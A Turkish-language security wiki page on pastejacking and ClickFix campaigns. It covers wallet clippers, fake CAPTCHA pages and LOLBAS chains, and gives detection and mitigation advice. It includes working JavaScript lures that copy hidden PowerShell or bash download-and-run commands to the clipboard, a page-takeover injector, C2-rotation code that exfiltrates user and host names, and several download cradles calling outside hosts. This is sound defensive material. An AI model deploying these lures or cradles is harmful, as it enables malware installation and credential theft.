# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – diğer adıyla *pastejacking* – kullanıcıların komutları kontrol etmeden kopyalayıp yapıştırması gerçeğini kötüye kullanır. Kötü amaçlı bir web sayfası (veya Electron ya da Desktop uygulaması gibi JavaScript çalıştırabilen herhangi bir bağlam), saldırganın kontrolündeki metni programatik olarak sistem clipboard’una yerleştirir. Kurbanlar, genellikle dikkatle hazırlanmış social-engineering talimatlarıyla, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp clipboard içeriğini *yapıştırmaya* yönlendirilir; böylece keyfi komutlar hemen çalıştırılır.

**Hiçbir dosya indirilmediği ve hiçbir attachment açılmadığı için**, bu teknik attachment’ları, macro’ları veya doğrudan komut çalıştırmayı izleyen çoğu e-mail ve web-content güvenlik kontrolünü aşar. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware ailelerini dağıtan phishing kampanyalarında popülerdir.

## Wallet-address replacement clippers

Başka bir **clipboard hijacking** varyantı hiç komut yapıştırmaz: kurban bir **cryptocurrency wallet address** kopyalayana kadar bekler, ardından yapıştırmadan hemen önce bunu saldırganın kontrolündeki bir adresle sessizce değiştirir. Bu, özellikle uzun wallet formatlarına karşı etkilidir; çünkü kullanıcılar çoğu zaman yalnızca ilk/son karakterleri doğrular.

Gerçek dünyada yaygın özellikler:
- **Thin loader + nested payload**: görünür app/exe meşru bir trading ya da "profit" aracı gibi görünür, gerçek clipper ise bundle’ın daha derininde gizlidir (örneğin iç içe bir Rust payload başlatan bir .NET loader).
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi string’leri veya hatta genel **44 karakterli Solana benzeri** string’leri eşleştirir ve bunları saldırgan wallet’larıyla yeniden yazar.
- **Wallet rotation at scale**: modern Windows örnekleri, tek bir statik adres yerine para birimi başına **binlerce** replacement wallet gömebilir; böylece her hırsızlıktan sonra wallet reputation burn azalır.

### Windows clipper flow

Yaygın bir implementasyon, **`AddClipboardFormatListener`** ile kayıtlı gizli bir penceredir. Her clipboard güncellemesinde malware tipik olarak şunları çağırır:
- **`OpenClipboard`** → mevcut clipboard verisine erişir.
- **`GetClipboardData`** → metni okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string’ini saldırganın değeriyle değiştirir.

Clippers içinde sık görülen minimal hunting regex’leri:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Kullanıcı düzeyinde persistence etki için yeterlidir. Gözlemlenen bir örüntü şudur:
- Payload’u **`%APPDATA%\silke\silke.exe`** konumuna kopyala
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında bir **Startup-folder LNK** oluştur

Detection fikirleri:
- Sürekli clipboard API’lerini çağırırken aynı zamanda `%APPDATA%` ve kullanıcı **Startup** klasörü altına yazan process’ler.
- Yeni LNK/executable oluşturulmasının ardından wallet-address clipboard yeniden yazımlarının gelmesi.
- Çok sayıda kullanılmayan dosya ve nested binary’yi başlatan küçük bir launcher içeren arşivler veya sahte software paketleri.

### macOS sosyal mühendislik ile quarantine kaldırma + LaunchAgent persistence

macOS üzerinde, bazı kampanyalar bir **`unlocker.command`** yardımcı dosyası dağıtır ve Gatekeeper uygulamanın hasarlı olduğunu veya tanınmayan bir geliştiriciden geldiğini söylerse kurbana sağ tık → **Open** yapmasını söyler. Script yalnızca quarantine’i kaldırır ve yakındaki `.app` dosyasını çalıştırır:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Bu **bir Gatekeeper exploit değil**; Gatekeeper kararlarının `com.apple.quarantine` xattr’a bağlı olmasını kötüye kullanan **sosyal mühendislik tabanlı bir quarantine bypass**’tır.

Çalıştırıldıktan sonra, clipper geçerli kullanıcı olarak şu dosyaları yazarak kalıcı olabilir:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` ve `KeepAlive` içeren LaunchAgent

Faydalı bir savunma detayı: bazı örnekler, LaunchAgent ve wrapper’ı yaklaşık her 30 saniyede bir yeniden yazan bir **self-healing watchdog** uygular. Plist’i, çalışan process’i öldürmeden önce kaldırırsanız, malware onu hemen yeniden oluşturabilir. Güvenli temizleme sırası:
1. Aktif clipper process’ini sonlandırın.
2. LaunchAgent plist’ini unload/delete edin.
3. `~/launch.sh` ve kopyalanmış payload’ı silin.

### Teslimat notu: force multiplier olarak sahte itibar

Bu aile için malware teknik olarak basit kalabilirken, **distribution layer** ağır işi yapar: sahte GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views ve zararsız görünen VirusTotal comments/votes, binary’nin çalıştırılmadan önce güvenilir görünmesi için kullanılır.

## Zorla kopyalama butonları ve gizli payload’lar (macOS one-liners)

Bazı macOS infostealer’lar installer sitelerini (ör. Homebrew) kopyalayarak kullanıcıların yalnızca görünen metni seçmesini engellemek için **“Copy” butonunu zorla kullanır**. Clipboard girdisi, beklenen installer command’ının yanı sıra eklenmiş bir Base64 payload içerir (ör. `...; echo <b64> | base64 -d | sh`), böylece tek bir paste ile ikisi de çalışır; UI ise ek aşamayı gizler.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Eski kampanyalar `document.execCommand('copy')` kullanıyordu, yenileri ise asenkron **Clipboard API** (`navigator.clipboard.writeText`) üzerine dayanır.

## ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatted veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript, Base64 ile kodlanmış bir PowerShell one-liner’ı gizlice clipboard’a kaydeden `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
3. HTML talimatları kurbana şunu söyler: *“**Win + R**’ye basın, komutu yapıştırın ve sorunu çözmek için Enter’a basın.”*
4. `powershell.exe` çalışır, meşru bir executable ile kötü amaçlı bir DLL içeren bir arşivi indirir (klasik DLL sideloading).
5. Loader ek aşamaları decrypt eder, shellcode enjekte eder ve persistence kurar (ör. scheduled task) – sonunda NetSupport RAT / Latrodectus / Lumma Stealer çalışır.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll` arar.
* Kötü amaçlı DLL, API’leri **GetProcAddress** ile dinamik olarak çözümler, **curl.exe** üzerinden iki binary (`data_3.bin`, `data_4.bin`) indirir, bunları `"https://google.com/"` rolling XOR key kullanarak şifre çözer, son shellcode’u enjekte eder ve **client32.exe** (NetSupport RAT)’yi `C:\ProgramData\SecurityCheck_v1\` konumuna unzip eder.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `curl.exe` ile `la.txt` indirir
2. **cscript.exe** içinde JScript downloader’ı çalıştırır
3. Bir MSI payload getirir → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** çağrısı, `PartyContinued.exe` dosyasını alan, `Boat.pst` (CAB) içeriğini çıkaran, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe`’yi yeniden oluşturan ve sonunda tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine exfiltrates eden bir `.a3x` script çalıştıran gizli bir PowerShell script başlatır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmelerini tamamen atlar ve kurbanlara, WSH üzerinden JavaScript alan ve çalıştıran, bunu kalıcı hale getiren ve C2’yi günlük olarak döndüren tek satırlık bir komutu yapıştırmalarını söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Sıradan incelemeyi engellemek için çalışma zamanında ters çevrilen obfuscated URL.
- JavaScript, Startup LNK (WScript/CScript) üzerinden kendini kalıcı hale getirir ve C2’yi geçerli güne göre seçer – hızlı domain rotation sağlar.

Tarihe göre C2’leri rotate etmek için kullanılan minimal JS parçası:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sonraki aşama genelde kalıcılık kuran ve bir RAT (örn. PureHVNC) çeken bir loader dağıtır; çoğu zaman TLS’yi hardcoded bir certificate’e pinler ve trafiği chunking ile böler.

Bu varyanta özgü detection fikirleri
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` içinde WScript/CScript çağıran ve `%TEMP%`/`%APPDATA%` altında bir JS path kullanan LNK.
- Registry/RunMRU ve command-line telemetry içinde `.split('').reverse().join('')` veya `eval(a.responseText)`.
- Uzun command line olmadan uzun script beslemek için büyük stdin payload’larıyla tekrar eden `powershell -NoProfile -NonInteractive -Command -`.
- Sonrasında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi LOLBins çalıştıran Scheduled Tasks; bu da updater-benzeri bir task/path altında olur (örn. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük dönen C2 hostname’leri ve URL’leri ile `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern’i.
- Clipboard write event’lerini, ardından Win+R paste ve hemen sonrasında `powershell.exe` execution ile korele et.

Blue-teams, clipboard, process-creation ve registry telemetry’yi birleştirerek pastejacking abuse’ünü nokta atışı tespit edebilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** komutlarının geçmişini tutar – olağandışı Base64 / obfuscated girişlere bakın.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` ve `NewProcessName` şu değerlerden biri: { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* `%LocalAppData%\Microsoft\Windows\WinX\` veya temporary folders altında, şüpheli 4688 event’inden hemen önce gerçekleşen dosya oluşturma işlemleri için Event ID **4663**.
* EDR clipboard sensors (varsa) – `Clipboard Write` olayını hemen ardından gelen yeni bir PowerShell process’i ile korele edin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son dönem kampanyalar, kullanıcıları clipboard’larındaki OS-specific komutları native consoles içine kopyalamaya zorlayan sahte CDN/browser verification pages (“Just a moment…”, IUAM-style) kitlesel olarak üretiyor. Bu, execution’ı browser sandbox dışına taşır ve Windows ile macOS genelinde çalışır.

Builder-generated pages’in temel özellikleri
- `navigator.userAgent` üzerinden OS detection yaparak payload’ları uyarlama (Windows PowerShell/CMD vs. macOS Terminal). Desteklenmeyen OS’ler için isteğe bağlı decoy/no-op ile illüzyonu sürdürme.
- Görünen text ile clipboard content farklı olabilirken, masum UI actions (checkbox/Copy) sırasında otomatik clipboard-copy.
- Mobile blocking ve adım adım instructions içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsiyonel obfuscation ve ele geçirilmiş bir site’nin DOM’unu Tailwind-styled verification UI ile üzerine yazan single-file injector (yeni domain registration gerekmez).

Örnek: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS ilk çalıştırmanın persistence’ı
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın, böylece terminal kapandıktan sonra da execution devam eder ve görünür artifacts azalır.

Compromised sitelerde yerinde sayfa takeover’ı
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM tarzı lure’lara özgü tespit ve hunting fikirleri
- Web: Clipboard API’yi doğrulama widget’larına bağlayan sayfalar; görüntülenen metin ile clipboard payload arasında uyumsuzluk; `navigator.userAgent` dallanması; şüpheli bağlamlarda Tailwind + tek sayfa replace.
- Windows endpoint: Bir browser etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` içinden çalıştırılan batch/MSI installer’lar.
- macOS endpoint: Browser olaylarına yakın şekilde `Terminal`/`iTerm`’in `bash`/`curl`/`base64 -d` başlatması ve `nohup`; terminal kapandıktan sonra da yaşayan background job’lar.
- `RunMRU` Win+R geçmişi ve clipboard yazmalarını, sonraki console process creation ile korele edin.

Destekleyici teknikler için ayrıca bakın

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 sahte CAPTCHA / ClickFix evrimleri (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini kompromize etmeye ve external hosts’ları zincirleyen loader JavaScript enjekte etmeye devam ediyor (Cloudflare Workers, GitHub/jsDelivr) ve hatta güncel lure logic’i çekmek için blockchain “etherhiding” çağrılarını bile kullanıyor (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API endpoint’lerine POST). Son overlay’ler, bir şey indirmek yerine kullanıcıları bir satırlık komutu kopyala/yapıştır yapmaya yönlendiren sahte CAPTCHA’ları yoğun biçimde kullanıyor (T1204.004).
- İlk execution giderek signed script host’lara/LOLBAS’a devrediliyor. Ocak 2026 zincirlerinde önceki `mshta` kullanımı, `WScript.exe` üzerinden çalıştırılan yerleşik `SyncAppvPublishingServer.vbs` ile değiştirildi; uzak içeriği çekmek için alias’lar/wildcard’lar ile PowerShell benzeri argümanlar geçirildi:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ile ve alışılmadık argümanlarla (`gal`/`gcm` takma adları, wildcarded cmdlets, jsDelivr URLs) birlikte kullanıldığında ClearFake için yüksek sinyalli bir LOLBAS aşaması haline gelir.
- Şubat 2026 sahte CAPTCHA payload’ları tekrar saf PowerShell download cradles’a kaydı. İki canlı örnek:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir, bellekte çalışan bir `iex(irm ...)` grabber; ikinci zincir `WinHttp.WinHttpRequest.5.1` üzerinden aşamalandırır, geçici bir `.ps1` yazar ve ardından gizli bir pencerede `-ep bypass` ile başlatır.

Bu varyantlar için tespit/avlanma ipuçları
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` veya clipboard yazımlarının/Win+R’nin hemen ardından PowerShell cradles.
- Command-line anahtar kelimeleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains veya raw IP `iex(irm ...)` kalıpları.
- Network: script hosts/PowerShell’den web gezintisinden kısa süre sonra CDN worker hosts’a veya blockchain RPC endpoint’lerine giden outbound bağlantılar.
- File/registry: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu one-liner’ları içeren RunMRU girdileri; external URLs veya obfuscated alias strings ile çalışan signed-script LOLBAS (WScript/cscript/mshta) için block/alert.

## Mitigations

1. Browser hardening – clipboard write-access’i (`dom.events.asyncClipboard.clipboardItem` vb.) devre dışı bırakın veya user gesture zorunlu kılın.
2. Security awareness – kullanıcılara hassas komutları *yazmalarını* ya da önce bir text editor’e yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile arbitrary one-liner’ları engelleyin.
4. Network controls – bilinen pastejacking ve malware C2 domain’lerine giden outbound istekleri engelleyin.

## Related Tricks

* **Discord Invite Hijacking** genellikle kullanıcılar malicious bir server’a çekildikten sonra aynı ClickFix yaklaşımını kötüye kullanır:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
